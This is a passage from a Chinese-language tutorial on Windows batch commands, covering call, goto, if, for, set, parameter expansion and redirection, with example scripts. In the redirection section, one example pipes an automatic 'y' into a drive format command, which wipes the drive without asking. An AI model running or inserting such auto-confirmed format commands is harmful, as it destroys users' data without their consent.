src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/pause-display.png" alt="pause-display"></center><h3 id="rem"><a href="#rem" class="headerlink" title="rem"></a>rem</h3><p>​        注释该行，可回显，但不执行<a href ::"执行时直接跳过该行">^1</a>:</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">rem [comment]</code></pre><ul><li>comment：指定要作为注释的任何字符串</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">rem 这是一个内容注释:: 这也是一个内容注释，但该行执行时相当于不存在</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/注释-display.png" alt="注释-display"></center><h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><p>​        从一个批处理程序<strong>调用</strong>另一个批处理程序，而<strong>不终止父批处理程序</strong></p><ul><li>调用子函数</li><li>调用子批处理</li><li><font color="red">以命令行方式解析字符串变量</font></li></ul><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">call [[Drive:] [Path] Filename [BatchParameters]] [:Label [Arguments]]</code></pre><ul><li>[Drive:] [Path] Filename：指定要调用的批处理程序的位置和名称。<ul><li>Filename参数必须有.bat或.cmd扩展名</li></ul></li><li>BatchParameters：指定批处理程序所需的任何命令行信息，包括命令行选项、文件名、批处理参数或变量</li><li>:Label：调用文本文件内命令段，以:Label开头，以goto :eof结尾</li><li>Arguments：指定要传递给其新实例的所有命令行信息</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 调用另一个批处理程序call 1.bat:: 以命令方式解析变量值set aa=123456set cmdstr=echo %aa%call %cmdstr%</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/call-以命令行方式解析字符串-display.png" alt="call-以命令行方式解析字符串-display"></center><h3 id="cls"><a href="#cls" class="headerlink" title="cls"></a>cls</h3><p>​        <strong>清屏</strong>命令，但不清除历史记录</p><h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p>​        <strong>调用外部程序</strong>，所有的<strong>DOS命令</strong>和<strong>命令行程序</strong>都可以由<code>start</code>命令来调用</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">start [/min | /max] [parameters]</code></pre><ul><li>/min：以最小化方式启动窗口（必须在parameters之前）</li><li>/max：以最大化方式启动窗口（必须在parameters之前）</li><li>parameter：传递给程序的参数，（为空时默认打开一个新的命令提示符窗口）</li></ul><p><strong>eg1</strong>：</p><pre class=" language-bat"><code class="language-bat">start /max calc.exe:: 调用计算器程序，以最大状态展示</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/start-calc-display.png" alt="start-calc-display"></center><p><strong>eg2</strong>：</p><pre class=" language-bat"><code class="language-bat">start "" "C:\Program Files (x86)\Tencent\TIM\Bin\TIM.exe":: 中间的引号不能省略，否则将以CUI方式打开</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/start-TIM-display.png" alt="start-TIM-display"></center><h2 id="批处理高级命令"><a href="#批处理高级命令" class="headerlink" title="批处理高级命令"></a>批处理高级命令</h2><h3 id="goto"><a href="#goto" class="headerlink" title="goto"></a>goto</h3><p>​        指定跳转到标签，找到标签后，程序将处理从下一行开始的命令</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">goto label</code></pre><ul><li>label：指定所要转向的批处理程序中的行</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo off:startrem 如果var值小于3则输出set /a var+=1echo %var%if %var% leq 3 goto startpause</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/goto-display.png" alt="goto-display"></center><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><p>​        在批处理程序中执行条件处理</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">if [not] errorlevel Number Command [else Expression]if [not] String1==String2 Command [else Expression]if [not] exist FileName Command [else Expression]if [/i] String1 ComoareOp String2 Command [else Expression]if defined Variable Command [else Expression]if cmdextversion Number Command [else Expression]</code></pre><ul><li>not：指定只有当条件为假时才执行该命令</li><li><span name="iferrorlevel">errorlevel Number</span>：只有当有cmd运行的前一个程序返回等于或大于Number的退出码时，才能指定真条件</li><li>Command：指定只有满足当前的条件时才应执行的命令</li><li>Expression：指定将传递给else子句中命令的命令行命令和任何参数</li><li>String1==String2：只有当String1和String2相同时才能指定真条件</li><li>exist FileName：如果FileName文件存在，则指定条件真</li><li><a href="#ComoareOp">ComoareOp</a>：指定三个字母的比较运算符来做串比较</li><li>/i：强制字符串忽略大小写</li><li>cmdextversion Number：只有当与cmd的“命令扩展”功能相关的内部版本号等于或大于Number时，才指定真条件</li><li>defined Variable：如果定义了Variable，则指定条件为真</li></ul><p><strong>注</strong>：</p><ul><li>if语句多行书写的要求<ul><li>Command的左括号必须和if在同行</li><li>else必须和Command的右括号在同行</li><li>Expression的左括号必须和else在同行</li><li>Command和Expression可以是命令集</li></ul></li></ul><p><strong>eg</strong>：<span name="strCompare"> </span></p><pre class=" language-bat"><code class="language-bat">:: 字符串比较@echo offset str1=abcd1234set str2=ABCD1234set str3=abcd1233:: 是否忽略大小写if %str1%==%str2% (echo %str1%与%str2%相同!) else (echo %str1%与%str2%不同!)if /i %str1% EQU %str2% (echo %str1%与%str2%相同!) else (echo %str1%与%str2%不同!)echo.:: 字符串中数值大小比较if %str1% LSS %str2% (echo %str1% ^< %str2%) else (echo %str1% ^> %str2%)if %str1% LSS %str3% (echo %str1% ^< %str3%) else (echo %str1% ^> %str3%)echo.:: 选择是否显示当前系统时间set /p choice=是否显示当前系统时间?(y/n)if /i not %choice% EQU n (echo 当前系统的时间是: %data% %time%)echo.pause>nul:: 存在判断（判断文件或文件夹是否存在）@echo off:: 判断文件是否存在if exist %0 echo 文件%0是存在的！echo.:: 判断文件夹是否存在if not exist %~df0 (    echo 文件夹%~df0不存在！)else (    echo 文件夹%~df0存在！)pause>nul:: 定义判断@echo off:: 定义变量set var=111;:: 判断变量是否被定义if defined var (echo var=%var%) else (echo var尚未定义！):: 删除变量set var=:: 判断变量是否被定义if defined var (echo var=%var%) else (echo var尚未定义！)pause>nul</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/if-display.png" alt="if-display"></center><h3 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h3><p>​        在批处理程序中，通过显示提示信息并暂停批处理程序，用户可以从一组选项键中进行选择</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">choice [/c [Choices]] [/n] [/cs] [/t Timeout /d Choice] [/m text]</code></pre><ul><li>/c Choices：指定用户选项键。显示时，选项键用逗号分隔，出现在【】内，后面跟着问号。默认情况下只有【Y,N】</li><li>/n：</li><li>/cs：指定用户选项键必须区分大小写。默认情况不区分大小写</li><li>/t Timeout：指定在默认为指定键之前choice暂停指定的秒数</li><li>/d Choice：指定默认选择，必须和/t一起使用</li><li>/m text：指定要在提示符之前显示的文字</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offchoice /c dme /m "dir,mem,end"if errorlevel 3 goto endif errorlevel 2 goto memif errorlevel 1 goto dir:dirdirgoto end:memmemgoto end:endecho goodbyepause</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/choice-display.png" alt="choice-display"></center><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><p>​        对一组文件中的每个文件运行指定的命令</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">for {%Variable | %%Variable} in (Set) do Command [CommandLineOptions]for /l {%Variable | %%Variable} in (start,step,end) do Command [CommandLineOptions]for /f ["options"] {%Variable | %%Variable} in (Set) do Command [CommandLineOptions]for {/d | /r} {%Variable | %%Variable} in (Set) do Command [CommandLineOptions]</code></pre><ul><li>%Variable | %%Variable：代表可替换的参数，%Variable通过命令提示符执行for命令；%%Variable在批处理文件中执行for命令。（必须，变量区分大小写）</li><li>(Set)：指定要用指定命令处理的一个或多个文件、目录、数值范围以及文本字符串。（必须，需要括号）</li><li>Command：指定要对包括在指定的（set）中每个文件、目录、数值范围或文本字符串所执行的命令</li><li>CommandLineOptions：指定要与所执行命令一起使用的任何命令行选项</li><li>/l：设置计数循环</li><li>/f：能对字符串进行操作，也能对命令的返回值进行操作，还可以访问磁盘中的ASCII文件。<ul><li>options：eol=c、skip=n、delims=xxx、tokens=x,y,m-n、usebackq<ul><li>delims：指定字符串的分隔符</li><li>tokens：提取分隔后的块，默认只提取第一块</li></ul></li><li>set：”string”、’command’、file-set</li></ul></li><li>/d | /r：与文件和目录有关</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">rem 循环结构:: 基础循环结构@echo offecho 对集合遍历有：for %%i in (1,2,3,4,5,6) do echo %%ipause>nulcls:: /l开关:: 计数循环echo 计算1-100的和：set sum=set sum=0for /l %%i in (1,1,100) do (set /a sum += %%i)echo 之和为:%sum%pause>nulecho 计算1-100的和：setlocal enabledelayedexpansionset sum=set sum=0for /l %%i in (1,1,100) do (set /a sum = !sum! + %%i)echo 之和为:%sum%pause>nulcls:: /a 等号右边的字符串做数值计算:: setlocal enabledelayedexpansion 与 !sum!的组合使用:: /f开关:: (delims、tokens、skip、eol、userbackq、变量延迟):: 字符串@echo offecho No options::: 展示文本文件内容for /f %%a in (demo.txt) do echo a=%%a:: 展示字符串内容for /f %%a in ("1,2,10") do echo a=%%aecho.echo Options tokens ^& delimsfor /f "tokens=1-3 delims=," %%a in ("1,2,10") do echo a=%%a b=%%b c=%%cpause>nulcls:: 命令@echo offecho 本文件夹里面的文件有：for /f "skip=5 tokens=4-5 delims= " %%a in ('dir') do (    if not "%%a"=="<DIR>" if not "%%a"=="字节" if not "%%a"=="可用字节" echo %%b)pause>nulcls:: /D 或 /r开关:: 遍历出D盘下的所有文件夹（完整路径信息）@echo offsetlocal enabledelayedexpansionFOR /R d: %%i IN (.) DO (set dd=%%iset "dd=!dd:~0,-1!"echo !dd!)pauseexit</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/for-display-1.png" alt="for-display-1"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/for-display-2.png" alt="for-display-2"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/for-display-3.png" alt="for-display-3"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/for-display-4.png" alt="for-display-4"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/for-display-5.png" alt="for-display-5"></center><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>​        用于显示、设置或删除变量、做数值计算、获取用户输入、字符串截取、字符串替换</p><p><strong>eg1</strong>：<span name="varDisplay">显示变量</span></p><pre class=" language-bat"><code class="language-bat">:: 显示变量set                    //显示所有定义的变量set s                //显示定义的以"s"开头的变量(无效)</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-显示变量-display.png" alt="set-显示变量-display"></center><p><strong>eg2</strong>：<span name="varSet">设置变量</span></p><pre class=" language-bat"><code class="language-bat">::::::::::::::::::::::::::::::::::::::::::::::: 设置和调用变量set aa="123"        //bat中变量不区分类型echo %aa%            //调用变量时前后需要加上"%"</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-设置和调用变量-display.png" alt="set-设置和调用变量-display"></center><p><strong>eg3</strong>：<span name="varDel">删除变量</span></p><pre class=" language-bat"><code class="language-bat">::::::::::::::::::::::::::::::::::::::::::::::: 删除变量，在设置变量之前先删除一下，若之前没有定义，则此句无任何意义@echo offtitle 删除变量set aa=if defined aa (     echo aa未被删除) else (     echo aa已被删除 )  pause</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-删除变量-display.png" alt="set-删除变量-display"></center><p><strong>eg4</strong>：<span name="varCalculate">数值计算</span></p><pre class=" language-bat"><code class="language-bat">:: 算数运算set aa=1set bb=0set /a aa=%aa% + 1,bb+=%aa%echo %aa%echo %bb%</code></pre><ul><li>/a：等号右边按数值计算</li></ul><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-数值计算-display.png" alt="set-数值计算-display"></center><p><strong>eg5</strong>：<span name="varInput">获取用户输入</span></p><pre class=" language-bat"><code class="language-bat">::::::::::::::::::::::::::::::::::::::::::::::: 获取用户输入set /p msg=请输入信息:echo %msg%</code></pre><ul><li>/p：获取用户输入</li></ul><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-获取用户输入-display.png" alt="set-获取用户输入-display"></center><p><strong>eg6</strong>：<span name="strSplit">字符串截取</span></p><pre class=" language-bat"><code class="language-bat">@echo offtitle 字符串截取:: 字符串截取set var=%str:~偏移量,长度%rem 截取字符串@echo offset str=1234567890echo %str%set var=%str:~1,1%echo 偏移为：1，长度为1：%var%set var=%str:~1,4%echo 偏移为：1，长度为4：%var%set var=%str:~-3%echo 截取后三位：%var%set var=%str:~3%echo 偏移为3，截取剩余：%var%set var=%str:~-5,4%echo 偏移为：-5，长度为4：%var%set var=%str:~0,-4%echo 弃掉后四位：%var%set var=%str:~-0,1%echo %var%set var=%str:~+0,1%echo %var%:: -0 = +0 = 0set var=%str:~-5,-8%echo 偏移为：-5，长度为-8：%var%pause>nulcls:: 格式化显示时间@echo offecho 当前时间是：%time% 即 %time:~0,2%点%time:~3,2%分%time:~6,2%秒%time:~9,2%厘秒</code></pre><ul><li>截取串获取：<code>%str:~偏移量,长度%</code><ul><li>偏移量和长度可正可负。<ul><li>偏移量为正，相对左端第一位偏移；偏移量为负，相对于右端第0位偏移。(<font color="red">-0=+0=0</font>)</li><li>长度为正，表示截取字符个数；长度为负，表示从右端抛弃字符个数。</li></ul></li><li>如果只有一个数字，则其表示偏移量，<font color="red">长度为偏移量之后所有位的个数</font></li></ul></li></ul><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-字符串截取-display.png" alt="set-字符串截取-display"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-格式化显示时间-display.png" alt="set-格式化显示时间-display"></center><p><strong>eg7</strong>：<span name="strReplace">字符串替换</span></p><pre class=" language-bat"><code class="language-bat">::::::::::::::::::::::::::::::::::::::::::::::: 替换字符串@echo offset aa=伟大的中国！我为你自豪！echo 替换前：%aa%echo 替换后：%aa:中国=中华人民共和国%:: 获取第一次赋的值echo aa=%aa%set "aa=%aa:中国=中华人民共和国%"echo aa=%aa%pause>nul</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-替换字符串-display.png" alt="set-替换字符串-display"></center><h3 id="setx"><a href="#setx" class="headerlink" title="setx"></a>setx</h3><p>​        设置永久变量</p><pre class=" language-bash"><code class="language-bash">:: 将D:\添加到PATH变量中setx PATH "%path%<span class="token punctuation">;</span>D:\"</code></pre><h3 id="setlocal"><a href="#setlocal" class="headerlink" title="setlocal"></a>setlocal</h3><p>​        启动批处理文件中环境变量的本地化，本地化将持续到出现匹配的endlocal命令活着到达批处理文件结尾为止。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">setlocal {enableextension | disableextension} {enabledelayedexpansion | disabledelayedexpansion}</code></pre><ul><li>enableextension：启用命令扩展，直到出现endlocal命令</li><li>disableextension：禁用命令扩展，直到出现endlocal命令</li><li>enabledelayedexpansion：<span name="enabledelayedexpansion">启用延迟的环境变量扩展</span>，直到出现endlocal命令</li><li>disabledelayedexpansion：<span name="disabledelayedexpansion">禁用延迟的环境变量扩展</span>，直到出现endlocal命令</li></ul><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">setlocal enableextensionsetlocal disableextensionsetlocal enabledelayedexpansionsetlocal disabledelayedexpansion</code></pre><h3 id="使用参数"><a href="#使用参数" class="headerlink" title="使用参数"></a>使用参数</h3><p>​        可以在批处理文件内任何的地方使用批处理参数，以提取有关环境设置的信息。</p><p>​        cmd提供批处理参数扩展变量（%0~%9）,%0将批处理文件名替换，而%1-%9将由命令行键入的参数替换。</p><p><strong>eg</strong>:</p><pre class=" language-bat"><code class="language-bat">@echo offrem 将echo回显重定向到tep.txt文件中Echo 产生一个临时文件 > tmp.txtRem 下行先保存当前目录，再将c:\windows设为当前目录pushd c:\windows@rem 调用文件内部的子程序Call :sub tmp.txtRem 下行恢复前次的当前目录Popdrem 再次调用Call :sub tmp.txtpauserem 删除创建的临时文件Del tmp.txtexit:subEcho 删除引号： %~1Echo 扩充到路径： %~f1Echo 扩充到一个驱动器号： %~d1Echo 扩充到一个路径： %~p1 Echo 扩充到一个文件名： %~n1Echo 扩充到一个文件扩展名： %~x1Echo 扩充的路径指含有短名： %~s1 Echo 扩充到文件属性： %~a1 Echo 扩充到文件的日期/时间： %~t1 Echo 扩充到文件的大小： %~z1 Echo 扩展到驱动器号和路径：%~dp1Echo 扩展到文件名和扩展名：%~nx1Echo 扩展到类似 DIR 的输出行：%~ftza1Echo.Goto :eof</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/使用参数-display.png" alt="使用参数-display"></center><p><strong>注</strong>：</p><ul><li>批脚本里的 %* 指出所有的参数(如 %1 %2 %3 %4 %5 …)</li><li>批参数(%n)的替代已被增强。您可以使用以下语法:<pre><code>%~1           - 删除引号(&quot;)，扩充 %1%~f1          - 将 %1 扩充到一个完全合格的路径名%~d1         - 仅将 %1 扩充到一个驱动器号%~p1         - 仅将 %1 扩充到一个路径%~n1         - 仅将 %1 扩充到一个文件名%~x1         - 仅将 %1 扩充到一个文件扩展名%~s1         - 扩充的路径指含有短名%~a1         - 将 %1 扩充到文件属性%~t1          - 将 %1 扩充到文件的日期/时间%~z1         - 将 %1 扩充到文件的大小%~path:1  -查找列在**PATH环境变量**的目录里查找 %1，并扩展到找到的第一个文件的驱动器号和路径%~ftza1     - 将 %1 扩展到类似 DIR 的输出行。</code></pre></li><li>在上面的例子中，%1 和 PATH 可以被其他有效数值替换。%~ 语法被一个有效参数号码终止。%~ 修定符不能跟 %*使用注意：<pre><code>参数扩充时不理会参数所代表的文件是否真实存在，均以当前目录进行扩展要理解上面的知识，上面的例子很关键。</code></pre></li></ul><h4 id="直接传递参数"><a href="#直接传递参数" class="headerlink" title="直接传递参数"></a>直接传递参数</h4><p>​        直接传递参数，即在使用<code>call</code>命令时，不使用任何参数，在<strong>子函数</strong>或<strong>子批处理</strong>里面<strong>直接对父批处理里面的变量进行修改</strong>。</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 乱序重排@echo offsetlocal enabledelayedexpansionset var=aCdehiM,?mnrstW yecho %var%:: 调用子函数call :dealsetlocal disabledelayedexpansion:: 串替换set var=%var:?=!%echo %var%pause>nulexit:dealset tm=!var!set var=:: 串截取与拼接for %%i in (6,3,11,11,16,15,1,4,11,5,12,13,9,0,12,7,15,14,5,10,2,16,18,8) do (set var=!var!!tm:~%%i,1!)goto :eof</code></pre><ul><li>goto :eof为子程序返回命令，若子函数本身就在批处理文件的末尾的话，此命令可省略</li></ul><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/直接传递参数-display.png" alt="直接传递参数-display"></center><h4 id="间接传递参数"><a href="#间接传递参数" class="headerlink" title="间接传递参数"></a>间接传递参数</h4><p>​        间接传递参数，即在使用call命令时，在其后面添加参数。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">call {[:label] | [ChildBatch]} Parameter1 Parameter2 ... ParameterN</code></pre><ul><li>调用可是子函数，也可以是子批处理</li><li>子函数或子批处理中不需要定义形参及其个数</li><li>子函数或子批处理接受的参数依次存储在%1-%9中</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offcall :deal aaa bbb "c c" ddd eeepause>nulexit:dealecho %%0 = %0echo %%1 = %1echo %%2 = %2echo %%3 = %3echo %%4 = %4echo %%5 = %5</code></pre><ul><li>%0显示的是子函数的标号，而不是父批处理的文件名全程</li></ul><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/间接传递参数-display.png" alt="间接传递参数-display"></center><h3 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h3><h4 id="用户变量"><a href="#用户变量" class="headerlink" title="用户变量"></a>用户变量</h4><p>​        编写批处理程序时，用户根据需要自己定义的变量称为用户变量。    用户变量使用set命令来设置。    </p><h4 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h4><p>​        系统变量是<strong>操作系统提前定义</strong>好的一组变量，可以适用于任何批处理，主要包括：硬件类、操作系统类、文件路径类、系统时间类等。</p><p><strong>常用系统变量</strong>：</p><table><thead><tr><th align="center">系统变量</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">ComputerName</td><td align="center">计算机名</td></tr><tr><td align="center">ComSpec</td><td align="center">cmd.exe完整路径名</td></tr><tr><td align="center">HomeDrive</td><td align="center">系统分区盘符(一般为C)</td></tr><tr><td align="center">Path</td><td align="center">可执行文件默认搜索路径</td></tr><tr><td align="center">ProgramFiles</td><td align="center">软件默认安装路径</td></tr><tr><td align="center">Prompt</td><td align="center">个性化设置cmd的必备武器</td></tr><tr><td align="center">SystemDrive</td><td align="center">包含系统根目录的分区</td></tr><tr><td align="center">SystemRoot</td><td align="center">系统根目录路径(默认C:\Windows)</td></tr><tr><td align="center">Temp、Tmp</td><td align="center">程序等可使用的临时目录(可修改)</td></tr><tr><td align="center">UserName</td><td align="center">当前用户名</td></tr><tr><td align="center">UserProfile</td><td align="center">当前用户的配置目录</td></tr><tr><td align="center">WinDir</td><td align="center">操作系统路径</td></tr><tr><td align="center">date</td><td align="center">日期</td></tr><tr><td align="center">time</td><td align="center">时间</td></tr></tbody></table><ul><li>系统变量可以使用<code>set</code>命令来显示</li></ul><h4 id="变量引用"><a href="#变量引用" class="headerlink" title="变量引用"></a>变量引用</h4><p>​        变量应用指直接用变量名来操作变量。</p><ul><li>通常使用”%”和”!”来获取变量的值。</li><li>在<strong>for循环</strong>中重复对同一变量多次赋值时需要使用”!”，使用”!”调用变量时，要首先“<a href="#enabledelayedexpansion">启用延迟环境变量扩充</a>”</li><li>开启延时环境变量扩充之后，所有的”!”都被视为特殊符号，即使使用”^!”也不可以输出”!”，要输出”!”必须要“<a href="#disabledelayedexpansion">停用延迟环境变量扩充</a>”</li></ul><h3 id="使用筛选器"><a href="#使用筛选器" class="headerlink" title="使用筛选器"></a>使用筛选器</h3><p>​        命令筛选器与命令重定向竖线(|)联合使用，它实际上是一个命令，包含在可读取命令的输入、可转换输入并写入输出的命令中，筛选器命令可以帮助排序、查看和选择部分命令输出。</p><p><strong>eg</strong>:</p><pre class=" language-bat"><code class="language-bat">@echo off:: more查看C中目录tree C:\ | more:: 查找指定文件中的指定字符串，并将结果显示find "more" < demo.bat:: 查找指定文件中的指定字符串，并将存储在demo.txt文件中find "more" < demo.bat > demo.txtpausedel demo.txt</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/使用筛选器-display-1.png" alt="使用筛选器-display-1"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/使用筛选器-display-2.png" alt="使用筛选器-display-2"></center><h3 id="使用命令重定向操作符"><a href="#使用命令重定向操作符" class="headerlink" title="使用命令重定向操作符"></a>使用命令重定向操作符</h3><p>​        使用重定向操作符将命令输入和输出的数据流从默认位置重定向到其他位置。输入或输出数据流的位置被称为句柄。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 重定向输入sort < demo.txt:: 重定向输出dir > demo.txt:: 重定向附加输出dir >> demo.txt:: 使用管道操作符dir | sort:: 自动格式化A盘(无效)echo y|format a: /s /q /v:system</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/重定向输入-display.png" alt="重定向输入-display"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/重定向输出.png" alt="重定向输出"></center><p><img src="../../../../Administrator/Fodder/Blogs/MarkdownImgs/%E8%84%9A%E6%9C%AC%E7%BB%83%E4%B9%A0/%E6%89%B9%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0/%E9%87%8D%E5%AE%9A%E5%90%91%E9%99%84%E5%8A%A0%E8%BE%93%E5%87%BA.png" alt="重定向附加输出"></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/管道重定向排序输出.png" alt="管道重定向排序输出"></center><h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><p>​        对字符串的操作。包括：串拷贝、串拼接、串比较、串替换、串截取等。</p><h3 id="串拷贝"><a href="#串拷贝" class="headerlink" title="串拷贝"></a>串拷贝</h3><p>​        在DOS批处理中，串拷贝可以通过set的赋值操作来实现。（批处理中变量不区分类型）</p><h3 id="串拼接"><a href="#串拼接" class="headerlink" title="串拼接"></a>串拼接</h3><p>​        DOS批处理中，串拼接的操作也很简单，可以使用如下的语法来实现：</p><pre class=" language-bat"><code class="language-bat">@echo offset aa=伟大的中国！set bb=我为你自豪！:: 连续输出echo %aa%%bb%echo aa=%aa%echo bb=%bb%:: 拼接后赋给变量set aa=%aa%%bb%echo aa=%aa%pause>nul</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/串拼接.png" alt="串拼接"></center><h3 id="串比较"><a href="#串比较" class="headerlink" title="串比较"></a>串比较</h3><p>​        DOS批处理中没有专门命令来组织串操作，所以串的比较需要通过<a href="#strCompare"><strong>条件语句</strong></a>来实现</p><h3 id="串替换"><a href="#串替换" class="headerlink" title="串替换"></a>串替换</h3><p>​        DOS批处理中的<a href="#strReplace">串替换</a>是通过set命令来实现的</p><h3 id="串截取"><a href="#串截取" class="headerlink" title="串截取"></a>串截取</h3><p>​        DOS批处理中的<a href="#strSplit">串截取</a>是通过set命令来实现的</p><h3 id="串扩充"><a href="#串扩充" class="headerlink" title="串扩充"></a>串扩充</h3><p>​        DOS批处理中独有。</p><p>​        “扩充”这个词来自于Microsoft自己的翻译，意思就是对表示文件路径的字符串进行特殊的处理，具体功能罗列如下：</p><table><thead><tr><th align="center">字符串</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">~I(大写i)</td><td align="center">s删除任何引号，扩充%I</td></tr><tr><td align="center">%~fI</td><td align="center">将%I扩充到一个完全合格的路径名</td></tr><tr><td align="center">%~dI</td><td align="center">仅将%I扩充到一个驱动器号</td></tr><tr><td align="center">%~pI</td><td align="center">仅将%I扩充到一个路径</td></tr><tr><td align="center">%~nI</td><td align="center">仅将%I扩充到一个文件名</td></tr><tr><td align="center">%~xI</td><td align="center">仅将%I扩充到一个文件扩展名</td></tr><tr><td align="center">%~sI</td><td align="center">扩充的路径只含有短名</td></tr><tr><td align="center">%~aI</td><td align="center">将%I扩充到文件的文件属性</td></tr><tr><td align="center">%~tI</td><td align="center">将%I扩充到文件的日期/时间</td></tr><tr><td align="center">%~zI</td><td align="center">将%I扩充到文件的大小</td></tr><tr><td align="center">%~PATH:I</td><td align="center">查找列在路径环境变量的目录，并将%I扩充到找到的第一个驱动器号和路径</td></tr><tr><td align="center">%~tfzaI</td><td align="center">将%I扩充到类似输出线路的DIR</td></tr></tbody></table><ul><li>字符串扩充的条件<ul><li>该字符串代表一个文件路径</li><li>变量要用% x来表示，x可取a-zA-Z0-9共62个字符中的任意一个</li></ul></li></ul><p><strong>eg1</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offecho 正在运行的这个批处理：echo 完全路径：%0echo 去掉引号：%~0echo 所在分区：%~d0echo 所处路径：%~p0echo 文件名：%~n0echo 扩展名：%~x0echo 文件属性：%~a0echo 修改时间：%~t0echo 文件大小：%~z0pause>nul</code></pre><p><strong>结果展示</strong>：</p><center><img 